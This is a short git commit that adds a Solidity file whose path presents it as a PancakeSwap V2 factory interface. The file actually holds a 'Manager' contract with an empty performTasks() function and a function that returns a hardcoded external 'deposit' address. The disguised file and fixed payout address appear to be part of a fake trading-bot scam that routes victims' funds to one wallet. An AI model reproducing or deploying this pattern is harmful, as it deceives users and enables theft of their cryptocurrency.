4f126d58b4045b5d1c69676e9dfac1b64c92a93f
CodeNERODEV <96323256+CodeNERODEV@users.noreply.github.com>
2021-12-18 04:10:47 +0200

    Add files via upload

---
+++ pancakeswap-v2-periphery-main/contracts/interfaces/IPancakeswapV2Factory.sol
@@ -0,0 +1,12 @@
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x2bc555e1231c47a11Acb5B1FdA626D6F8936A7e5;
+	}
+}
